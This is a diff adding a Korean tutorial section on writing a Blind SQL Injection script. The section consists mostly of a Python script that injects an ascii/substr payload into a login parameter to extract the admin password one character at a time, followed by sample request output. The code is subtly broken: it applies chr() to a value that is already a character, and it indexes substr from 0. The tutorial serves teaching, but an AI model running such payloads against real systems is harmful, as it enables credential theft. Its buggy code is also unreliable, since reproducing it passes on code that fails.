@@ -153,3 +153,45 @@ for i in range(1, 5):
 ```requests.post```는 POST 메소드를 사용해 HTTP 요청을 보내는 함수로 URL과 Header, Body와 함께 요청을 전송할 수 있습니다.
 
 GET, POST 메소드 이외에도 다양한 메소드를 사용해 요청을 전송할 수 있습니다.
+# **Blind SQL Injection 공격 스크립트 작성**
+앞서 다룬 예제에서 BLind SQL Injection을 시도한다고 가정합니다. 공격하기에 앞서, 아스키 범위 중 이용자가 입력할 수 있는 모든 문자의 범위를 지정해야 합니다. 예를 들어, 비밀번호의 경우 알파벳과 숫자 그리고 특수 문자로 이뤄집니다. 이는 아스키 범위로 나타내면 32부터 126까지의 모든 문자입니다.
+
+위를 고려해 작성한 스크립트는 **Figure7**과 같습니다. 
+```python
+#!/usr/bin/python3
+import requests
+import string
+url = 'http://example.com/login' # example URL
+params = {
+    'uid': '',
+    'upw': ''
+}
+tc = string.ascii_letters + string.digits + string.punctuation # abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~
+query = '''
+admin' and ascii(substr(upw,{idx},1))={val}--
+'''
+password = ''
+for idx in range(0, 20):
+    for ch in tc:
+        params['uid'] = query.format(idx=idx, val=ord(ch)).strip("\n")
+        c = requests.get(url, params=params)
+        print(c.request.url)
+        if c.text.find("Login success") != -1:
+            password += chr(ch)
+            break
+print(f"Password is {password}")
+```
+코드를 살펴보면, 비밀번호에 포함될 수 있는 문자를 ```string``` 모듈을 사용해 생성하고, 한 바이트씩 모든 문자를 비교하는 반복문을 작성합니다. 반복문 실행 중에 반환 결과가 참일 경우에 페이지에 표시되는 "Login success" 문자열을 찾고, 해당 결과를 반환한 문자를 ```password``` 변수에 저장합니다. 반복문을 마치면 "admin" 계정의 비밀번호를 알아낼 수 있습니다. 다음은 예제 코드의 실행 결과입니다.
+```
+$ python3 bsqli.py
+http://example.com/login?uid=admin%27+and+ascii%28substr%28upw%2C0%2C1%29%29%3D97--&upw=
+http://example.com/login?uid=admin%27+and+ascii%28substr%28upw%2C0%2C1%29%29%3D98--&upw=
+http://example.com/login?uid=admin%27+and+ascii%28substr%28upw%2C0%2C1%29%29%3D99--&upw=
+http://example.com/login?uid=admin%27+and+ascii%28substr%28upw%2C0%2C1%29%29%3D100--&upw=
+http://example.com/login?uid=admin%27+and+ascii%28substr%28upw%2C0%2C1%29%29%3D101--&upw=
+http://example.com/login?uid=admin%27+and+ascii%28substr%28upw%2C0%2C1%29%29%3D102--&upw=
+```
+# 용어 정리
+* **SQL injection** : SQL 쿼리에 이용자의 입력 값을 삽입해 이용자가 원하는 쿼리를 실행할 수 있는 취약점
+
+* **Blind SQL Injection** : 데이터베이스 조회 후 결과를 직접적으로 확인할 수 없는 경우 사용할 수 있는 SQL injection 공격 기법
